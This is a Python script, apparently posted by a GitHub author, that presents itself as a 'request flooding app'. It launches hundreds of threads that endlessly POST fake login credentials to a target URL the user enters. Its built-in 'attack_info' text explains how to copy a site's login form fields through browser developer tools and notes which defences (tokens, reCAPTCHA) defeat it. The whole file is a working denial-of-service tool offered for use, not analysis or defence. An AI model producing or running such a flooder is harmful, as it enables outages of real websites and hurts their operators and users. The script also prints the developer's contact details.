import requests
import threading

print(
    """
                  __ _                 _ 
_ __ ___  __ _   / _| | ___   ___   __| |
| '__/ _ \/ _` | | |_| |/ _ \ / _ \ / _` |
| | |  __/ (_| | |  _| | (_) | (_) | (_| | ~>Request flooding app<~
|_|  \___|\__, | |_| |_|\___/ \___/ \__,_|~~>Made by tfwcodes(github)<~~
            |_|                          

   """
)
while True:
    try:
        # Help menu
        print(
            "[!] Enter recommended_threads to see how many threads are recommended for an ordinary pc" + "\n" + "[!] Enter attack_info to see info about how to start the attack" + "\n" + "[!] Enter start_attack to start the attack" + "\n" + "[!] Enter dev to see how to reach me")
        # It will make a while loop that prints the help menu and asks you to enter a command
        command = input("[+] Enter the command: ")
        if command == "start_attack":
            # Enter target url
            url = input("[+] Enter the target url: ")
            # Enter the number of threads that will be used in the attack
            number_of_threads = input("[+] Enter the number of threads: ")
            # Form data
            data = {
                'rcr_authenticate': '1',
                'rcr_user': 'dasdad',
                'rcr_pass': 'dsadadada',
                'rcr_submit': 'Conectare'
            }

            # The list of threads were all the threads are gonna be append
            list_of_threads = []


            # Make the while loop request with the method post
            def flood():
                while True:
                    response = requests.post(url, data=data)
                    print(response)


            # The multi-threading part
            # It will have number_of_threads(this is the variable that asks you for the number of threads) threads for this attack
            for i in range(int(number_of_threads)):
                # The multi-threading will have the target flood(where is the while loop request)
                t = threading.Thread(target=flood)
                t.daemon = True
                # t will be append in the list of threads (named list_of_threads)
                list_of_threads.append(t)

            for i in range(int(number_of_threads)):
                # Start the threads
                list_of_threads[i].start()

            for i in range(int(number_of_threads)):
                # Join the threads
                list_of_threads[i].join()
        if command == "attack_info":
            # Print info about how to start the attack
            print(
                "to start the attack you need too:" + "\n" + "1. first go to the target and go to inspect" + "\n" + "2. you put random data on the login page, then press f12 go to the network tab, then you make the request and go to the file that has the post method and scroll down untill you see the form data (if the target has an id, token, rechaptcha token or anything else the attack will not work)" + "\n" + "3. you paste what it is in the form data, then go into the program and paste the form data in to the variable named data like this: data = {'rcr_authenticate': '1', 'rcr_user': 'dfssf', 'rcr_pass': 'sdfsfs', 'rcr_submit': 'Conectare'} (this is an example)" + "\n" + "4. You run the app, you put the url you saw on the network which will be the target url, you put how many threads you want for the attack and start it:)")
        if command == "recommended_threads":
            # Print the recommended threads
            print(
                "The recommended threads for an ordinary pc are between 50-300 and if you have a powerful pc then the recommended threads are between 300-700")
        if command == "dev":
            print("Discord: tfw#2946, Gmail: mungureanuu@gmail.com")
    # If the user is gonna press Ctrl+C it wil exit the program
    except KeyboardInterrupt:
        exit()
